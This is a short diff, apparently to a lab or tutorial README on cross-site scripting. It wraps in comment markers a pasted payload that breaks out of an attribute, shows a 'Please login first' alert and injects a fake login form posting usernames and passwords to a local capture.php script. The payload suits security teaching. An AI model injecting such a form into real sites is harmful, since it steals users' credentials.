@@ -42,6 +42,7 @@ http://localhost:8000/capture.php
 
 
 ## Paste the payload in to the query
+/*
 "><script>alert('Please login first');</script>
 <h3>LOGIN</h3>
 <form action='http://localhost:8000/capture.php' method='post'>
@@ -49,6 +50,7 @@ http://localhost:8000/capture.php
   <label>Password:</label><input type='password' name='password'>
   <input type='submit' value='Login'>
 </form>
+*/
 
 
 
